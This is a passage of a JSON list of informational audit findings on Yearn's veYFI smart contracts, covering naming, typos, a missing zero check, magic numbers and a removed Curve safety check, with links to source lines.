old vaults. Is there a maximum allocation a gauge can receive? Is there minimum quorum for governance votes? Convex specifies these values: https://docs.convexfinance.com/convexfinance/general-information/voting-and-gauge-weights",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Variable naming inconsistency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The first input to initialize() has the following comment https://github.com/yearn/veYFI/blob/d53465c5f615a04204faed55728840a1e79377fc/contracts/Gauge.sol#L67 _stakingToken The vault token to stake Elsewhere in veYFI, the naming convention assumes that each gauge corresponds to one Yearn vault. But the name _stakingToken and the comment in issue 46 indicates this might not be correct. This should be clarified in the comments and the variable names.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Missing 0 check in setDuration()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "If block.timestamp < periodFinish, then the code will check if newDuration is zero, but this check will not happen if the if statement is skipped when block.timestamp > periodFinish https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L73 This can cause problems in other functions that divide by the duration https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L170-L177",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The MAX_DELAGATED variable should be spelled MAX_DELEGATED https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VoteDelegation.sol#L16 betwwen should be between https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L324 The last sentence in the ExtraReward.sol contract needs to be fixed, most likely by removing the words \"Gauge will\". It reads \"Gauge will this contract is used behind multiple delegate proxies.\" https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/ExtraReward.sol#L13-L14 \"claimm veYFI and aditional reward\" should be \"claim veYFI and additional reward\" (two typos) https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L373 Triger should be Trigger https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L131 veYFITotalSypply should be veYFITotalSupply https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L284 \"rewards are distributed during 7 days\" should says \"rewards are distributed during reward duration\" because duration is a variable and could change https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L12 \"over a week\" should say \"over the reward duration\" because duration is a variable and could change https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L130 \"restart a new week\" should say \"restart a new reward duration\" because duration is a variable and could change https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/BaseGauge.sol#L154 A reference to CRV exists in the vyper code. Change ERC20CRV to ERC20YFI https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L152 \"earning for an account\" should be \"earnings for an account\" https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L248-L249 \"address acccount\" should be \"address account\" https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L219",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Replace magic numbers with constants",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The value 1e18 appears throughout the contracts https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VeYfiRewards.sol#L62 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VeYfiRewards.sol#L69 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L245 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L274 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L280 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/ExtraReward.sol#L75 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/ExtraReward.sol#L86 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/ExtraReward.sol#L92",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Code inconsistency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The three different _updateReward() functions https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/ExtraReward.sol#L44 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VeYfiRewards.sol#L36 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L183",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Curve safety check removed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "This is the check in Curve: https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L418 https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L438 https://github.com/curvefi/curve-dao-contracts/blob/master/contracts/VotingEscrow.vy#L455 The check does not exist in the same locations in the veYFI VotingEscrow contract: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L458 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L496 https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L512 If this check is added to veYFI, it should also be added to createLockFor, a function that Curve does not have: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L477",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. No migrateLock sample implementation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The migrateLock() call in the existing veYFI code: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/VotingEscrow.vy#L606",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Use -= to keep code concise",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The += operator is used often in veYFI, but the -= operator is not used in this line https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L391 _balances[msg.sender] = _balances[msg.sender] - _amount; Consider changing this line to _balances[msg.sender] -= _amount;",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Update rewards for other users",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-veYFI.md",
        "body": "The depositFor() function: https://github.com/YAcademy-Residents/veYFI/blob/master/contracts/Gauge.sol#L344",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    }
]